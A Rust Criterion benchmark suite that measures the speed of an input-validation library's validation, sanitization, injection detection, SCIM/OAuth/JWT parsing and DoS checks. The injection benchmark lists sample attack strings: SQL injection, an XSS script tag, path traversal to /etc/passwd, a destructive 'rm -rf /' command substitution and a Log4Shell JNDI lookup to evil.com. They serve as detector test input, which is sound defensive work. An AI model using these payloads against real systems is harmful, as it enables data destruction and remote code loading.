//! Benchmark suite for input validation performance
//!
//! Measures performance of validation, sanitization, and parsing operations

use criterion::{black_box, criterion_group, criterion_main, BenchmarkId, Criterion, Throughput};
use input_validation::{
    dos_protection::{DoSConfig, DoSProtection},
    middleware::RequestValidator,
    parsers::{JwtParser, OAuthParser, ParserConfig, SafeParser, ScimParser},
    sanitization::{SanitizationConfig, Sanitizer},
    validation::{InputType, SecurityValidator, ValidatorConfig},
};
use std::time::Duration;

/// Benchmark input validation performance
fn bench_validation(c: &mut Criterion) {
    let mut group = c.benchmark_group("validation");

    // Setup validators
    let strict_validator = SecurityValidator::new(ValidatorConfig::production()).unwrap();
    let relaxed_validator = SecurityValidator::new(ValidatorConfig::development()).unwrap();

    // Test inputs of different sizes
    let small_input = "user@example.com";
    let medium_input = "a".repeat(1000);
    let large_input = "a".repeat(10000);

    // Benchmark different input types
    for input_type in
        [InputType::Email, InputType::Text, InputType::Username, InputType::ScimFilter]
    {
        group.bench_with_input(
            BenchmarkId::new("strict", format!("{:?}_small", input_type)),
            &small_input,
            |b, input| b.iter(|| strict_validator.validate(black_box(input), input_type)),
        );

        group.bench_with_input(
            BenchmarkId::new("relaxed", format!("{:?}_small", input_type)),
            &small_input,
            |b, input| b.iter(|| relaxed_validator.validate(black_box(input), input_type)),
        );

        group.bench_with_input(
            BenchmarkId::new("strict", format!("{:?}_medium", input_type)),
            &medium_input,
            |b, input| b.iter(|| strict_validator.validate(black_box(input), input_type)),
        );

        group.bench_with_input(
            BenchmarkId::new("strict", format!("{:?}_large", input_type)),
            &large_input,
            |b, input| b.iter(|| strict_validator.validate(black_box(input), input_type)),
        );
    }

    group.finish();
}

/// Benchmark injection detection performance
fn bench_injection_detection(c: &mut Criterion) {
    let mut group = c.benchmark_group("injection_detection");

    let validator = SecurityValidator::new(ValidatorConfig::production()).unwrap();

    let safe_inputs = vec![
        "normal text",
        "user@example.com",
        "userName eq \"john\"",
        "https://example.com/callback",
    ];

    let malicious_inputs = vec![
        "'; DROP TABLE users; --",
        "<script>alert('xss')</script>",
        "../../../etc/passwd",
        "$(rm -rf /)",
        "${jndi:ldap://evil.com/}",
    ];

    for (i, input) in safe_inputs.iter().enumerate() {
        group.bench_with_input(BenchmarkId::new("safe", i), input, |b, input| {
            b.iter(|| validator.check_injection(black_box(input)))
        });
    }

    for (i, input) in malicious_inputs.iter().enumerate() {
        group.bench_with_input(BenchmarkId::new("malicious", i), input, |b, input| {
            b.iter(|| validator.check_injection(black_box(input)))
        });
    }

    group.finish();
}

/// Benchmark sanitization performance
fn bench_sanitization(c: &mut Criterion) {
    let mut group = c.benchmark_group("sanitization");

    let strict_sanitizer = Sanitizer::strict();
    let normal_sanitizer = Sanitizer::normal();

    let test_inputs = vec![
        ("clean", "Hello world"),
        ("html", "<p>Hello <b>world</b></p>"),
        ("xss", "<script>alert('xss')</script>"),
        ("mixed", "Hello & <script>alert('test')</script> world"),
        ("unicode", "Hello αβγ world"),
        ("large", &"a".repeat(10000)),
    ];

    for (name, input) in test_inputs {
        group.throughput(Throughput::Bytes(input.len() as u64));

        group.bench_with_input(BenchmarkId::new("strict", name), &input, |b, input| {
            b.iter(|| strict_sanitizer.sanitize(black_box(input), InputType::Text))
        });

        group.bench_with_input(BenchmarkId::new("normal", name), &input, |b, input| {
            b.iter(|| normal_sanitizer.sanitize(black_box(input), InputType::Text))
        });
    }

    group.finish();
}

/// Benchmark SCIM filter parsing
fn bench_scim_parsing(c: &mut Criterion) {
    let mut group = c.benchmark_group("scim_parsing");

    let parser = ScimParser::new(ParserConfig::production()).unwrap();

    let test_filters = vec![
        ("simple", "userName eq \"john\""),
        ("present", "active pr"),
        ("and", "userName eq \"john\" and active eq true"),
        ("or", "userName eq \"john\" or userName eq \"jane\""),
        ("nested", "(userName eq \"john\" and active eq true) or (userName eq \"jane\" and active eq false)"),
        ("complex", "userName eq \"john\" and (active eq true or role eq \"admin\") and not (status eq \"disabled\")"),
    ];

    for (name, filter) in test_filters {
        group.throughput(Throughput::Bytes(filter.len() as u64));

        group.bench_with_input(BenchmarkId::new("parse", name), &filter, |b, input| {
            b.iter(|| parser.parse(black_box(input)))
        });

        group.bench_with_input(BenchmarkId::new("validate_only", name), &filter, |b, input| {
            b.iter(|| parser.validate_input(black_box(input)))
        });
    }

    group.finish();
}

/// Benchmark OAuth parameter parsing
fn bench_oauth_parsing(c: &mut Criterion) {
    let mut group = c.benchmark_group("oauth_parsing");

    let parser = OAuthParser::new(ParserConfig::production()).unwrap();

    let test_params = vec![
        ("simple", "grant_type=authorization_code&client_id=test123"),
        ("full", "grant_type=authorization_code&client_id=test123&redirect_uri=https%3A%2F%2Fexample.com%2Fcallback&scope=read%20write&state=abc123"),
        ("pkce", "grant_type=authorization_code&client_id=test123&code_verifier=dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk&code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM&code_challenge_method=S256"),
    ];

    for (name, params) in test_params {
        group.throughput(Throughput::Bytes(params.len() as u64));

        group.bench_with_input(BenchmarkId::new("parse", name), &params, |b, input| {
            b.iter(|| parser.parse(black_box(input)))
        });
    }

    group.finish();
}

/// Benchmark JWT parsing
fn bench_jwt_parsing(c: &mut Criterion) {
    let mut group = c.benchmark_group("jwt_parsing");

    let parser = JwtParser::new(ParserConfig::production()).unwrap();

    // Create sample JWTs (these are not cryptographically valid, just for parsing tests)
    let header = base64::encode_config(r#"{"alg":"RS256","typ":"JWT"}"#, base64::URL_SAFE_NO_PAD);
    let small_payload =
        base64::encode_config(r#"{"sub":"user123","exp":9999999999}"#, base64::URL_SAFE_NO_PAD);
    let large_payload = base64::encode_config(
        &format!(r#"{{"sub":"user123","exp":9999999999,"data":"{}"}}"#, "x".repeat(1000)),
        base64::URL_SAFE_NO_PAD,
    );
    let signature = "fake_signature";

    let small_jwt = format!("{}.{}.{}", header, small_payload, signature);
    let large_jwt = format!("{}.{}.{}", header, large_payload, signature);

    group.throughput(Throughput::Bytes(small_jwt.len() as u64));
    group.bench_with_input(BenchmarkId::new("parse", "small"), &small_jwt, |b, input| {
        b.iter(|| parser.parse(black_box(input)))
    });

    group.throughput(Throughput::Bytes(large_jwt.len() as u64));
    group.bench_with_input(BenchmarkId::new("parse", "large"), &large_jwt, |b, input| {
        b.iter(|| parser.parse(black_box(input)))
    });

    group.finish();
}

/// Benchmark DoS protection
fn bench_dos_protection(c: &mut Criterion) {
    let mut group = c.benchmark_group("dos_protection");

    let dos_protection = DoSProtection::new(DoSConfig::production());

    // Benchmark size checks
    let sizes = vec![100, 1000, 10000, 100000];
    for size in sizes {
        group.bench_with_input(BenchmarkId::new("size_check", size), &size, |b, &size| {
            b.iter(|| dos_protection.size_limiter().check_field_size(black_box(size)))
        });
    }

    // Benchmark JSON structure validation
    let json_samples = vec![
        ("simple", r#"{"name":"test","value":123}"#),
        (
            "nested",
            r#"{"user":{"name":"test","profile":{"email":"test@example.com","settings":{"theme":"dark"}}}}"#,
        ),
        ("array", r#"{"items":[1,2,3,4,5,6,7,8,9,10]}"#),
    ];

    for (name, json) in json_samples {
        group.bench_with_input(BenchmarkId::new("json_validation", name), &json, |b, input| {
            b.iter(|| dos_protection.size_limiter().validate_json_structure(black_box(input)))
        });
    }

    group.finish();
}

/// Benchmark middleware components
fn bench_middleware(c: &mut Criterion) {
    let mut group = c.benchmark_group("middleware");

    let request_validator =
        RequestValidator::new(ValidatorConfig::production(), SanitizationConfig::strict()).unwrap();

    let test_inputs = vec![
        ("email", "user@example.com"),
        ("scim_filter", "userName eq \"test\""),
        ("oauth_param", "grant_type=authorization_code"),
        ("malicious", "<script>alert('xss')</script>"),
    ];

    for (name, input) in test_inputs {
        group.bench_with_input(
            BenchmarkId::new("validate_and_sanitize", name),
            &input,
            |b, input| {
                b.iter(|| {
                    request_validator.validate_and_sanitize(black_box(input), InputType::Text)
                })
            },
        );
    }

    group.finish();
}

/// Benchmark concurrent validation
fn bench_concurrent_validation(c: &mut Criterion) {
    let mut group = c.benchmark_group("concurrent_validation");
    group.measurement_time(Duration::from_secs(10));

    let validator = SecurityValidator::new(ValidatorConfig::production()).unwrap();
    let inputs: Vec<String> = (0..1000).map(|i| format!("test_input_{}", i)).collect();

    group.bench_function("sequential", |b| {
        b.iter(|| {
            for input in &inputs {
                black_box(validator.validate(input, InputType::Text));
            }
        })
    });

    group.bench_function("parallel", |b| {
        b.iter(|| {
            use rayon::prelude::*;
            inputs.par_iter().for_each(|input| {
                black_box(validator.validate(input, InputType::Text));
            });
        })
    });

    group.finish();
}

/// Benchmark memory usage patterns
fn bench_memory_usage(c: &mut Criterion) {
    let mut group = c.benchmark_group("memory_usage");

    let validator = SecurityValidator::new(ValidatorConfig::production()).unwrap();

    // Test with inputs of increasing size to measure memory scaling
    let sizes = vec![100, 1000, 10000, 50000];

    for size in sizes {
        let input = "a".repeat(size);
        group.throughput(Throughput::Bytes(size as u64));

        group.bench_with_input(BenchmarkId::new("validation_memory", size), &input, |b, input| {
            b.iter(|| {
                // Validate multiple times to test memory reuse
                for _ in 0..10 {
                    black_box(validator.validate(black_box(input), InputType::Text));
                }
            })
        });
    }

    group.finish();
}

criterion_group!(
    validation_benches,
    bench_validation,
    bench_injection_detection,
    bench_sanitization,
    bench_scim_parsing,
    bench_oauth_parsing,
    bench_jwt_parsing,
    bench_dos_protection,
    bench_middleware,
    bench_concurrent_validation,
    bench_memory_usage
);

criterion_main!(validation_benches);
